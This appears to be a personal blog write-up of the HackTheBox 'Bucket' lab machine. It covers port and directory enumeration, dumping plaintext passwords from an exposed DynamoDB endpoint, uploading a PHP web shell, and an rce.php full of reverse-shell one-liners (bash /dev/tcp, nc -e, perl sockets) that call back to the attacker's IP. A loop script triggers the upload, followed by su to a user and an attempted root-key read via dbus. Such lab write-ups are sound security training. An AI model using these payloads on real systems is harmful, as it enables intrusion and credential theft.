---
layout: post
title: HackTheBox Write-up &mdash; Bucket
---

This machine is a Linux machine on IP `10.10.10.212`.

Running an `nmap` scan, we see two ports open:
```bash
$ nmap -sC -sV 10.10.10.212
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-03 03:58 EST
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 25.07% done; ETC: 03:58 (0:00:06 remaining)
Nmap scan report for 10.10.10.212
Host is up (0.24s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://bucket.htb/
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.61 seconds
```

Just like Passage, we have an `ssh` and an `http` port open.  Let's have a look at the `http` port!

We will add the machine to our `hosts` file for ease of use:
```bash
echo "10.10.10.212 bucket" | sudo tee -a /etc/hosts
```

We go to `http://bucket:80`, which redirects us to `http://bucket.htb`, but we come to an error: `we can't connect to server at bucket.htb`, or `we're having trouble finding that site`.  Looking closer at the `nmap` output, we see that the `http-title` "Did not follow redirect".

Running a more comprehensive search or ports up to port number `65535` we find
```bash
$ sudo masscan -e tun0 -p1-65535 --rate=1000 10.10.10.212                                                         1 ⨯

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2021-03-03 09:17:45 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 80/tcp on 10.10.10.212                                    
Discovered open port 22/tcp on 10.10.10.212     
```
```bash
$ mkdir nmap && touch full.nmap && sudo nmap -sC -sV -O -p- -oA nmap/full 10.10.10.212 && cat full.nmap            1 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-03 04:26 EST
Stats: 0:09:42 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 44.50% done; ETC: 04:48 (0:12:05 remaining)
Stats: 0:19:54 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 71.95% done; ETC: 04:54 (0:07:45 remaining)
Nmap scan report for bucket (10.10.10.212)
Host is up (0.23s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|    f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://bucket.htb/
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1841.64 seconds~
```

So this isn't very different.  Let's try UDP scan:
```bash
$ sudo nmap -sUV -T4 10.10.10.212
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-03 05:01 EST
Warning: 10.10.10.212 giving up on port because retransmission cap hit (6).
Stats: 0:20:42 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 6.25% done; ETC: 05:37 (0:15:45 remaining)
Nmap scan report for bucket (10.10.10.212)
Host is up (0.35s latency).
All 1000 scanned ports on bucket (10.10.10.212) are closed (968) or open|filtered (32)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1291.65 seconds

$ sudo nmap -sUV -F 10.10.10.212
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-03 05:23 EST
Nmap scan report for bucket (10.10.10.212)
Host is up (0.39s latency).
All 100 scanned ports on bucket (10.10.10.212) are closed

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.29 seconds

$ sudo nmap -sU -O -p- -oA nmap/udp 10.10.10.212
Nmap scan report for bucket (10.10.10.212)
Host is up (0.26s latency).
All 65535 scanned ports on bucket (10.10.10.212) are closed (65324) or open|filtered (211)
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85588.49 seconds
```
Nothing here... (but it took a minute)!

After some searching on Linux forums, it looks like the problem might in fact be in my `hosts` file.  Changing
```bash
10.10.10.212 bucket
```
to
```bash
10.10.10.212 bucket.htb
```
fixed this issue.  This took me annoyingly long to figure out, but good to know!

It looks like the page is an advertising platform.  There are three main links at the top: `Home`, `About`, and `Feed`.  As usual, let's look at the page source!

The only thing of interest to me in the page source is that the server pulls (or attempts to pull) images from the following website:
```
http://s3.bucket.htb/adserver/images/
```

Though I can't seem to get to this website (via `ping` nor browser).













After a bit of searching, I found a tool to check what subdomains there might be with a given site.  This tool is called `gobuster`.  

I first tried it with the initial site:
```bash
$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -t 50 -e -u http://bucket.htb                               1 ⨯
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://bucket.htb
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/03/04 06:05:46 Starting gobuster
===============================================================
http://bucket.htb/.htpasswd (Status: 403)
http://bucket.htb/.htaccess (Status: 403)
http://bucket.htb/server-status (Status: 403)
===============================================================
2021/03/04 06:07:48 Finished
===============================================================
```

Okay, so after quite a bit more researching, I found that the `/etc/hosts` file takes multiple domain names.  Hence, I change the line defined above to look like the following:
```
10.10.10.212    bucket  bucket.htb      s3.bucket.htb
```
And it works!

So, going to `http://s3.bucket.htb` I get the following page:
```
{"status":"running"}
```

But we know it is pulling images from this site, so we should try to find some subdomains.  As above (when we were trying to debug the `s3` issue, we can use `gobuster` here to see what subdomains of `s3.bucket.htb` we have access to:
```
$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -t 50 -e -u http://s3.bucket.htb
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://s3.bucket.htb
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/03/06 21:11:16 Starting gobuster
===============================================================
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/!: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/00-inc: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/00-cache: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/!_images: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/!ut: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/00-mp: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/00-ps: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/007: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/007007: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/01: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/02: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/0246: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.listing: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/!backup: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/!images: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/!res: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/!textove_diskuse: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.htpasswd: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.bash_history: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.bashrc: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.cvs: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.forward: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.history: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.htaccess: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.subversion: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.svn: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.passwd: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.perf: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.profile: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.rhosts: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.ssh: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/03: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
http://s3.bucket.htb/health (Status: 200)
http://s3.bucket.htb/server-status (Status: 403)
http://s3.bucket.htb/shell (Status: 200)
===============================================================
2021/03/06 21:14:38 Finished
```

This is very interesting!  We seem to have access to two subdomains: `health` and `shell`.  (For a reminder of `HTTP` statuses, check out my [cheat sheet](https://github.com/jakewilliami/http-status-cheat-sheet/blob/master/http-status-cheat-sheet.pdf)).

We check out `health` and find this:
![_config.yml]({{ site.baseurl }}/images/bucket-s3-health.png)
![_config.yml]({{ site.baseurl }}/images/bucket-s3-health-headers.png)

This is obvious that this site is running an AWS server, as `s3` (and DynamoDB, as I have just searched up) are AWS tools.

Going to `shell`, we get redirected to `http://444af250749d:4566/shell/`, which then does not load.  After some playing around, it is important to have the forward slash at the end of the URL: `http://s3.bucket.htb/shell/`, which does *not* cause a reditect.  It takes us to a page that is a DynamoDB Web Shell, which uses JavaScript.

I search "AWS S3 DynamoDB" and find a lot of information on "S3 Buckets", etc.  The web shell looks like it has its own API.  I found [this](https://rhinosecuritylabs.com/penetration-testing/penetration-testing-aws-storage/) online.  To test this exploit, I need the [AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-welcome.html) (`sudo apt install awscli`).

To use the AWS CLI, we need to [configure ourselves](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/configure/index.html).  Then we can enumerate the DynamoDB enpoints.  We can use a made-up access key here.

```bash
$ aws configure      
AWS Access Key ID [None]: ct
AWS Secret Access Key [None]: secretkey
Default region name [None]: 
Default output format [None]: text
                                                                                                                                          
$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb # read the docs to learn more about enumeration with AWS!
TABLENAMES      users

$ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb
None    3       3
PASSWORD        Management@#1@#
USERNAME        Mgmt
PASSWORD        Welcome123!
USERNAME        Cloudadm
PASSWORD        n2vM-<_K_Q:.Aa2
USERNAME        Sysadm
```

So we have usernames and associated passwords in the `users` table in DynamoDB.  This is great... But where to use them? To find that out, let's try to find out more about the buckets associated with `bucket.htb` through the AWS CLI (our Lord and Saviour):
```bash
$ aws --endpoint-url http://s3.bucket.htb/ s3 ls
2021-03-06 22:17:03 adserver
```

Well, we knew this one existed, as that's where the source code of `bucket.htb` comes from!  But We can enumerate buckets from the `adserver`.  (The images here we saw previously should appear here, as we have discovered from the page source!)
```bash
$ aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserver/images/
2021-03-06 22:19:04      37840 bug.jpg
2021-03-06 22:19:04      51485 cloud.png
2021-03-06 22:19:04      16486 malware.png
```

I make a mental note that there are three images (uploaded, possibly, by three different people), and three different password-username combinations from the `users` table...

So, I check the `help` section of AWS CLI, and find that you can actually edit (copy, move, delete) files!  Surely we can do something similar to what we did in Passage and get a reverse shell.  Then we have a foothold!

I use the `shell.php` we made in Passage and see if we get a reverse shell.  This file looks like this:
```bash
$ cat shell.php
<?php system($_REQUEST['cmd']) ?>
```

However, this reverse shell allowed us to access a `cmd` argument.  But when we go to the page, we cannot do so (it just asks us to download the file we uploaded), so we need a more intricate RCE script.  Here's one I found online:
```bash
$ cat rce.php
<?php
echo 'running shell';
$ip='10.10.14.239'; # THIS IS YOUR `tun0` PORT IP
$port='1234';
$reverse_shells = array(
    '/bin/bash -i > /dev/tcp/'.$ip.'/'.$port.' 0<&1 2>&1',
    '0<&196;exec 196<>/dev/tcp/'.$ip.'/'.$port.'; /bin/sh <&196 >&196 2>&196',
    '/usr/bin/nc '.$ip.' '.$port.' -e /bin/bash',
    'nc.exe -nv '.$ip.' '.$port.' -e cmd.exe',
    "/usr/bin/perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"".$ip.":".$port."\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
    'rm -f /tmp/p; mknod /tmp/p p && telnet '.$ip.' '.$port.' 0/tmp/p',
    'perl -e \'use Socket;$i="'.$ip.'";$p='.$port.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
);
foreach ($reverse_shells as $reverse_shell) {
   try {echo system($reverse_shell);} catch (Exception $e) {echo $e;}
   try {shell_exec($reverse_shell);} catch (Exception $e) {echo $e;}
   try {exec($reverse_shell);} catch (Exception $e) {echo $e;}
}
system('id');
?>
```

We want to upload this file to the AWS server, so we use the CLI:
```bash
$ aws --endpoint-url http://s3.bucket.htb/ s3 cp shell.php s3://adserver/shell.php
upload: ./shell.php to s3://adserver/shell.php                   
                                                                                                                                          
$ aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserver/       
                           PRE images/
2021-03-06 22:31:02       5344 index.html
2021-03-06 22:31:37         39 rce.php
```

Cool!  It has accepted our file!

I go onto http://bucket.htb/shell.php, but it has a 404 error.  This is strange... I list what is on `adserver` again, and it is gone!  It looks like the system cleans itself.  We will need to gain shell access fast then, it seems.  It looks to be cleaning itself ever minute or so.  We can write a `bash` script to automate uploading and accessing this file:
```bash
#! /bin/bash
#
# Usage: In seperate terminal run `nc -nlvp 1234` and then run `chmod u+x rce.sh && ./rce.sh`.
#
# Press Ctrl+C when `nc` listener has found something.

RCE_FILE_NAME="rce.php"

echo "Uploading RCE file to bucket..."

aws --endpoint-url http://s3.bucket.htb/ s3 cp "$RCE_FILE_NAME" s3://adserver/

echo
echo "File uploaded."
echo "Executing reverse shell...  Ensure a netcap listener is running"
echo "Kill this script with Ctrl+C upon a successful connection"

while [ true ]
do
	if [[ ! -z "$(aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserver/ | grep "$RCE_FILE_NAME")" ]]
	then
		curl http://bucket.htb/"$RCE_FILE_NAME" &> /dev/null
	else
		echo "RCE file has been cleaned from the bucket.  Stopping..."
	fi
done
```

We will need to run `nc` to listen for access while running this script (see our Passage writeup) and quit this script when we have a foothold.

Now we have a foothold, and we run the same python script we did last time to get a better shell:
```
$ nc -nlvp 1234                                                                                            1 ⨯
listening on [any] 1234 ...
connect to [10.10.14.239] from (UNKNOWN) [10.10.10.212] 44336
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'           
www-data@bucket:/var/www/html$ 
```

Now we just play around, trying to find anything.  In Passage, they had user data, but we already have that!  So we just have a look at what we can find.

We find in the `/home` directory a user called `roy`.  They have a `user.txt` file: that looks like a user flag!  So we know our goal at this minute is to get access to Roy's account, as the `user.txt` file currently isn't accessible with our present permissions.

We also see in Roy's home directory, a `project` folder.  In this folder is the following:
```
www-data@bucket:/var/www/html$ ls /home/roy/project
ls /home/roy/project
composer.json  composer.lock  db.php  vendor
www-data@bucket:/var/www/html$ ls /home/roy/project/db.php
ls /home/roy/project/db.php
/home/roy/project/db.php
www-data@bucket:/var/www/html$ cat /home/roy/project/db.php
cat /home/roy/project/db.php
<?php
require 'vendor/autoload.php';
date_default_timezone_set('America/New_York');
use Aws\DynamoDb\DynamoDbClient;
use Aws\DynamoDb\Exception\DynamoDbException;

$client = new Aws\Sdk([
    'profile' => 'default',
    'region'  => 'us-east-1',
    'version' => 'latest',
    'endpoint' => 'http://localhost:4566'
]);

$dynamodb = $client->createDynamoDb();

//todo
```

This `endpoint` variable has the same port number that I had when I was redirected, before I put a trailing slash after `shell`!  Just something to note.  I feel as though we need to exploit this directory&mdash;probably in the Web Shell&mdash;to get some kind of access... I am not sure yet.

Of course, Roy's password is encrypted:
```
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
roy:x:1000:1000:,,,:/home/roy:/bin/bash
```

But let us try accessing Roy's account using one of the passwords we found earlier!

```
www-data@bucket:/var/www/html$ su roy
su roy
Password: Management@#1@#

su: Authentication failure
www-data@bucket:/var/www/html$ su roy
su roy
Password: Welcome123!

su: Authentication failure
www-data@bucket:/var/www/html$ su roy
su roy
Password: n2vM-<_K_Q:.Aa2

roy@bucket:/var/www/html$
```

Indeed, one of these passwords worked!  We not have Roy's account, and user access!
```
roy@bucket:/var/www/html$ cat /home/roy/user.txt
cat /home/roy/user.txt
48c6************************f5e1
```

We naïvely try the same hack we did in Passage to try to get escalate our access to root level:
```
roy@bucket:/var/www/html$ cd /tmp && gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true && ssh -i pwn root@bucket;
<ssh/id_rsa /tmp/pwn true && ssh -i pwn root@bucket;
Error: GDBus.Error:org.freedesktop.DBus.Error.ServiceUnknown: The name com.ubuntu.USBCreator was not provided by any .service files
```

No luck.  After being naïve, I recall that this hack worked because we had an `ssh` port open.  We do have this port open here, though this doesn't seem to work.  No worries.  

We note that Roy doesn't actually have an `.ssh` directory in his `home`.  So perhaps `ssh` is not the vulnerability here?